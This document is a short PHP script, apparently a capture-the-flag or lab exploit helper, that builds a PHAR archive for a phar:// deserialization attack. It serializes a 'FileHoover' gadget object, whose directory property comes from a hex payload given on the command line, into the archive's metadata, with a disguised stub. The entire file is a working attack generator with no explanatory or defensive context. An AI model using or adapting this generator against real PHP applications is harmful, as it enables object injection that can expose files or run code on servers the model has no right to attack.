#!/usr/bin/env -S php --define phar.readonly=0 

<?php

if ($argc < 3) {
    echo "Usage: php create_phar.php <phar archive name> <FileHoover payload (hex)>\n";
    exit(1);
}

class FileHoover {
    public $directory = null;

    public function __construct($directory) {
        $this->directory = $directory;
    }
}

// echo $argv[2] . "\n\n";

// // Iterate over directory and print it in hex
// for ($i = 0; $i < strlen($fileHoover->directory); $i++) {
//     echo bin2hex($fileHoover->directory[$i]) . "";
// }

$fileHoover = new FileHoover(hex2bin($argv[2]));

$phar = new Phar($argv[1]);
$phar->startBuffering();
$phar->addFromString("test.txt", "text");
$phar->setStub("\n<?php echo __HALT_COMPILER(); ?>");
$phar->setMetadata($fileHoover);
$phar->stopBuffering();